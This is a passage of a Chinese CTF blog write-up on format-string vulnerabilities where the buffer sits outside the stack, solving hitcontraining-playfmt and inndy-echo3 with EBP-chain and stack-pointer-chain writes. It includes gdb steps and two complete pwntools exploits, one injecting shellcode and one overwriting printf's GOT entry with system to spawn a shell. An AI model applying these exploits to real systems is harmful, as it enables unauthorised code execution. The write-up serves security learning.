+<h2 id="格式化字符串不在栈上"><a href="#格式化字符串不在栈上" class="headerlink" title="格式化字符串不在栈上"></a>格式化字符串不在栈上</h2><p>有时候并不会这么刚好 format string 的 buf 在栈上当其在 data, bss 或是 heap 上的情况，无法在 stack 中放上一个 address 给任意读写的时候，可以使用在  stack 上现有的 pointer 进行写值。其中最常用的就是栈上现有的EBP链。</p>
+<h3 id="EBP链"><a href="#EBP链" class="headerlink" title="EBP链"></a>EBP链</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y9ykIj.png" srcset="/img/loading.gif" alt></p>
+<p>正如这个图，当一个程序完成了由main—&gt;A—&gt;B的函数调用，栈上就会存在一个EBP链，像图中的ebp3(B)—&gt;ebp2(A)—&gt;ebp1(main)，然后</p>
+<ul>
+<li>通过找准offset1(算一下ebp3与fmt字符串距离)对EBP2使用%hhn，就可以修改到EBP1的最低位，使得EBP1在一个256的范围内进行变化，可以改成你想要修改的栈内存单元指针（比如ret address的栈指针）。</li>
+<li>改写好EBP1后，找准offset2 (算一下EBP2与fmt字符串距离)再对EBP1使用%hhn或者%hn，即可完成对你想要修改的地址的写值。</li>
+</ul>
+<p>简单来说，这个攻击过程就是第一次使用漏洞是构造出我们要读写的地址，再一次则是对前面构造出来的地址进行任意读写。但需要注意的是，<strong>在这个过程当中一定要学会对栈上的已有数据的灵活的运用</strong>。</p>
+<p>接下来看一个题来仔细分析一下</p>
+<h4 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h4><h5 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span>
+<span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
+<span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span>
+<span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span>
+<span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span>
+<span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span></code></pre></div>
+
+<p>没有任何保护。</p>
+<h5 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_fmt</span><span class="hljs-params">()</span>
+</span>&#123;
+  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>
+
+  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )
+  &#123;
+    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0xC8</span>u);
+    result = <span class="hljs-built_in">strncmp</span>(buf, <span class="hljs-string">"quit"</span>, <span class="hljs-number">4u</span>);
+    <span class="hljs-keyword">if</span> ( !result )
+      <span class="hljs-keyword">break</span>;
+    <span class="hljs-built_in">printf</span>(buf);
+  &#125;
+  <span class="hljs-keyword">return</span> result;
+&#125;</code></pre></div>
+
+<p>其中看到buf在bss段：<br><img src="http://qiqianyun.chumen77.xyz/uPic/HRvwJA.png" srcset="/img/loading.gif" alt><br>这就是不在栈上，不能跟前面的题目一样，直接在栈上写上地址，然后来完成攻击。</p>
+<p>上层有main 和play函数，一共三层，且在第三层的do-fmt函数存在格式化字符串漏洞，让我们很方便的用ebp链来完成攻击。然后，有无限次的触发这个漏洞的机会。</p>
+<p>攻击思路 ：因为没有开nx保护，可以用shellcode进行攻击。修改某个函数返回地址，然后提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p>
+<h5 id="gdb调试-2"><a href="#gdb调试-2" class="headerlink" title="gdb调试"></a>gdb调试</h5><p>定位到printf函数处：</p>
+<div class="hljs"><pre><code class="hljs undefined">gdb-peda$ b *<span class="hljs-number">0x0804854F</span>
+Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x804854f</span></code></pre></div>
+
+<p>可以看一下此时的栈情况：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lYT98n.png" srcset="/img/loading.gif" alt><br>esp寄存器：<br><img src="http://qiqianyun.chumen77.xyz/uPic/vpsR9A.png" srcset="/img/loading.gif" alt><br>这里就把<code>0xffffd338</code>叫做ebp3，<code>0xffffd348</code>为ebp2，<code>0xffffd358</code>为ebp1。</p>
+<p>第一次修改：对ebp2使用<code>%xxhhn</code>修改ebp1为do-fmt函数的retaddr <code>0xffffd33c</code>的<strong>栈指针</strong>（这个栈指针可以通过leak一个栈地址，然后根据偏移算出来）</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/x0EjmA.png" srcset="/img/loading.gif" alt></p>
+<p>第二次修改 ： 对ebp1使用<code>%xxhn</code> 修改retaddr <code>0x80485ad</code> 为你在buf处提前摆上的shellcode</p>
+<p>这样程序在退出这个do-fmt函数就会jmp到shellcode上，这样就拿到shell了。</p>
+<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> time
+context.log_level = <span class="hljs-string">'debug'</span>
+context.arch = <span class="hljs-string">'i386'</span>
+io = process(<span class="hljs-string">'./ebp'</span>)
+<span class="hljs-comment"># io = remote('node3.buuoj.cn',29994)</span>
+buf = <span class="hljs-number">0x0804a080</span> + <span class="hljs-number">0x40</span> <span class="hljs-comment">#0x804a0c0</span>
+raw_input(<span class="hljs-string">'-&gt;'</span>)
+io.sendline(<span class="hljs-string">'%4$p'</span>)
+ret_stack_addr = int(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">28</span>
+print(<span class="hljs-string">'leak ret_stack_addr:'</span>+hex(ret_stack_addr))
+key1 = int(str(hex(ret_stack_addr))[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>)
+key2 = <span class="hljs-number">0xa0c0</span>
+payload = <span class="hljs-string">'%&#123;&#125;c%4$hhn'</span>.format(key1)
+raw_input(<span class="hljs-string">'-&gt;'</span>)
+io.sendline(payload)
+io.recv()
+payload = <span class="hljs-string">'%&#123;&#125;c%12$hn'</span>.format(key2)
+payload = payload.ljust(<span class="hljs-number">0x40</span>) 
+payload +=  asm(shellcraft.sh())
+io.sendline(payload)
+io.interactive()</code></pre></div>
+
+<p>这个题目就是很单纯的直接利用ebp链进行攻击即可。</p>
+<p>然后再看一个有点不一样的题目：</p>
+<h3 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h3><h4 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span>
+<span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
+<span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span>
+<span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
+<span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div>
+
+<h4 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt></p>
+<p>这一处会让栈结构的情况变得无法预测。然后进入hardfmt：</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )
+&#123;
+  read(<span class="hljs-number">0</span>, buff, <span class="hljs-number">0x1000</span>u);
+  <span class="hljs-built_in">printf</span>(buff);
+&#125;</code></pre></div>
+
+<p>这一处存在fmt漏洞，且往下看整个程序感觉没什么好利用的，没什么后门函数。那攻击思路就可以是：<strong>改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。</strong><br>（这个题目思路还是很简单的，但是栈的随机化，还有因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞，让这个题目不是很容易做）</p>
+<h4 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h4><p>定位到漏洞printf函数处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/KPo7Ve.png" srcset="/img/loading.gif" alt><br>会发现这个情况是没有<strong>构成ebp链</strong>的，这个时候就需要咱们自己来仔细观察栈上的数据，然后来挑选合适的栈数据来进行利用。</p>
+<p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间来进行分析，这样做起来会简单一些。</p>
+<p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt><br>仔细看下此时的栈情况 ，然后再次仔细分析下我们的目标 ：</p>
+<ul>
+<li>泄漏libc基址，计算出system的内存地址。</li>
+<li>在栈上构造出printf的got地址和printf的got+2的地址（0x0804a014和0x0804a016）</li>
+<li>在构造的got地址上，开始写system地址<br>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。</li>
+</ul>
+<p>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p>
+<p>此时注意图上前两个红框，可以发现把前二个红框<strong>虽不是ebp</strong>的链，但是这也是<strong>成一个链</strong>可以利用了。然后可以把第二个红框的两个地址修改为 第一个红框的两个栈指针：</p>
+<p>这里可以用gdb直接来手动设置，让咱们上来就写exp调试还是挺费劲的：</p>
+<div class="hljs"><pre><code class="hljs undefined">gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5e6c = 0xffbe5d54
+gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5e64 = 0xffbe5d60</code></pre></div>
+
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt></p>
+<p>这个过程中在泄漏目标栈地址以后，是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p>
+<p>接着就可以构造got地址和got+2地址：</p>
+<div class="hljs"><pre><code class="hljs undefined">gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5d60  = 0x0804a016
+gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5d54  = 0x0804a014</code></pre></div>
+
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p>
+<p>然后就可以利用对got地址和got+2地址使用<code>%xhn</code>,写system的内存地址上printf的got了：</p>
+<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0120</span>| <span class="hljs-number">0xffbe5d88</span> --&gt; <span class="hljs-number">0xffbe5e6c</span> --&gt; <span class="hljs-number">0xffbe5d54</span> --&gt; <span class="hljs-number">0x804a014</span> --&gt; <span class="hljs-number">0xf7e0cda0</span> (&lt;__libc_system&gt;:	<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0xc</span>)</code></pre></div>
+
+<p>写好以后，再传过去一下<code>/bin/sh</code>即可。</p>
+<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">'debug'</span>
+context.arch =<span class="hljs-string">'i386'</span>
+<span class="hljs-keyword">import</span> time
+elf = ELF(<span class="hljs-string">'./echo3'</span>)
+debug = <span class="hljs-number">1</span>
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    <span class="hljs-keyword">if</span> debug :
+        io = process(<span class="hljs-string">'./echo3'</span>)
+        libc = elf.libc
+    <span class="hljs-keyword">else</span>:
+        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25057</span>)
+        libc = ELF(<span class="hljs-string">'./libc-2.23.so.i386'</span>)
+    payload = <span class="hljs-string">'%43$pA%30$pA%47$p'</span>
+    io.sendline(payload)
+    address = io.recvline().strip()
+    <span class="hljs-keyword">if</span> address[<span class="hljs-number">-3</span>:] == <span class="hljs-string">'637'</span>:
+        <span class="hljs-keyword">if</span> address[<span class="hljs-number">7</span>:<span class="hljs-number">10</span>] == <span class="hljs-string">'637'</span>:
+            libc_base = int(address[<span class="hljs-number">2</span>:<span class="hljs-number">10</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">247</span> - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]
+            tag1_stack_point = int(address[<span class="hljs-number">13</span>:<span class="hljs-number">21</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">0x118</span>
+            tag2_stack_point = int(address[<span class="hljs-number">13</span>:<span class="hljs-number">21</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">0x104</span> - <span class="hljs-number">0x8</span>
+            system_addr = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]
+            print(<span class="hljs-string">'system_addr  -&gt;'</span> + hex(system_addr))
+            print(<span class="hljs-string">'tag1_stack_point -&gt;'</span> + hex(tag1_stack_point))
+            print(<span class="hljs-string">'tag2_stack_point -&gt;'</span> + hex(tag2_stack_point))
+            <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">else</span> :
+        io.close()
+        <span class="hljs-keyword">continue</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtshort</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>
+    result = <span class="hljs-string">""</span>
+    <span class="hljs-keyword">if</span> prev &lt; val :
+        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>
+    <span class="hljs-keyword">elif</span> prev == val :
+        result += <span class="hljs-string">''</span>
+    <span class="hljs-keyword">else</span> :
+        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>
+    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>
+    <span class="hljs-keyword">return</span> result
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtbyte</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">1</span>)</span>:</span>
+    result = <span class="hljs-string">""</span>
+    <span class="hljs-keyword">if</span> prev &lt; val :
+        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>
+    <span class="hljs-keyword">elif</span> prev == val :
+        result += <span class="hljs-string">''</span>
+    <span class="hljs-keyword">else</span> :
+        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>
+    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hhn"</span>
+    <span class="hljs-keyword">return</span> result
+printf_got = <span class="hljs-number">0x0804a014</span>
+key1 = int(hex(tag1_stack_point)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)
+key2 = int(hex(tag2_stack_point)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)
+info(<span class="hljs-string">'--------change the two points to tag_stack_point:-------'</span>)
+<span class="hljs-comment"># raw_input('-&gt;')</span>
+prev = <span class="hljs-number">0</span>
+payload = <span class="hljs-string">""</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):
+    payload +=fmtshort(prev,(key1 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">30</span>+i) 
+    prev = (key1 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):
+    payload +=fmtshort(prev,(key2 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">31</span>+i) 
+    prev = (key2 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>
+payload = payload + <span class="hljs-string">'1111'</span>
+io.sendline(payload)
+io.recvuntil(<span class="hljs-string">'1111'</span>)
+info(<span class="hljs-string">'--------change got_table to printf_got:-------'</span>)
+prev = <span class="hljs-number">0</span> 
+payload = <span class="hljs-string">""</span>
+key3 = <span class="hljs-number">0x14</span>
+key4 = <span class="hljs-number">0x16</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):
+    payload +=fmtbyte(prev,(key3 &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,<span class="hljs-number">87</span>+i) 
+    prev = (key3 &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):
+    payload +=fmtbyte(prev,(key4 &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,<span class="hljs-number">85</span>+i) 
+    prev = (key4 &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>
+payload = payload + <span class="hljs-string">'2222'</span>
+io.sendline(payload)
+io.recvuntil(<span class="hljs-string">'2222'</span>)
+info(<span class="hljs-string">'--------change printf_got to system_addr:-------'</span>)
+raw_input(<span class="hljs-string">'-&gt;'</span>)
+prev = <span class="hljs-number">0</span> 
+payload = <span class="hljs-string">""</span>
+key5 = int(hex(system_addr)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)
+key6 = int(hex(system_addr)[<span class="hljs-number">2</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>)
+print(<span class="hljs-string">'key5 -&gt; '</span> + hex(key5))
+print(<span class="hljs-string">'key6 -&gt; '</span> + hex(key6))
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):
+    payload +=fmtshort(prev,(key5 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">17</span>+i) 
+    prev = (key5 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):
+    payload +=fmtshort(prev,(key6 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">20</span>+i) 
+    prev = (key6 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>
+payload = payload + <span class="hljs-string">'3333'</span>
+io.sendline(payload)
+sleep(<span class="hljs-number">1</span>)
+io.recvuntil(<span class="hljs-string">'3333'</span>)
+raw_input(<span class="hljs-string">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'</span>)
+io.sendline(<span class="hljs-string">'/bin/sh\x00\x00\x00\x00\x00\x00'</span>)
+io.interactive()</code></pre></div>
+
+<p>这个exp的难点在于：</p>
+<ul>
+<li>注意去定位到合适的栈结构再去利用</li>
+<li>尽量充分利用每一次的printf</li>
+<li>单次printf多次写入</li>
+<li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。</li>
+</ul>
+<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>通过这两个例题说明，面对fmt的buf不在栈上时，归根结底也就是一定要学会<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。</p>
+<p>但是也是做题时，也是一定要优先考虑ebp链是否能利用，因为ebp链构成的话，它的相对偏移就是<strong>针对性程序本身的</strong>，基本不会受到libc版本的影响，用起来很好用，要优先考虑。</p>
+<p>还有就是面对这种会<strong>有随机栈情况、没有ebp链</strong>的题目，一定要注意本地和远程的libc版本、注意环境,因为这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                      <a class="hover-with-bg" href="/tags/学习记录/">学习记录</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/04/08/linux_ Lamp搭建记录/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">linux- Lamp搭建记录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/15/格式化字符串漏洞题目练习/">
+                        <span class="hidden-mobile">格式化字符串漏洞题目练习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "格式化字符串漏洞小总结（下）&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "left",
+      visible: "hover",
+      
+      icon: "#"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
